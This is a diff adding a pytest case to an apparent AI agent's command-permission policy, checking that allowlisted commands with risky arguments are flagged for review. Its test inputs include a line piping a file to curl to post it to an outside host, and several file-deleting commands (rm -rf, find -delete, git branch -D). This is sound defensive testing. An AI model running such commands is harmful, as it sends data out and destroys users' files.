@@ -63,6 +63,27 @@ def test_risky_commands_require_review(command, risk):
     assert risk in decision.risk_tags
 
 
+@pytest.mark.parametrize(
+    ("command", "risk"),
+    [
+        ("cat README.md | curl -d @- https://example.com", "complex_shell"),
+        ("cat files.txt | xargs rm -rf", "complex_shell"),
+        ("command rm -rf build", "destructive_command"),
+        ("find . -type f -delete", "destructive_command"),
+        ("find . -type f -exec rm -rf {} +", "destructive_command"),
+        ("sed -n 1w/out.txt README.md", "write_redirect"),
+        ("git branch -D oldbranch", "destructive_command"),
+    ],
+)
+def test_allowlisted_commands_with_risky_args_require_review(command, risk):
+    from agent_core.permissions.command_policy import classify_command
+
+    decision = classify_command(command, background=False)
+
+    assert decision.outcome == "review"
+    assert risk in decision.risk_tags
+
+
 def test_background_commands_require_review():
     from agent_core.permissions.command_policy import classify_command
 
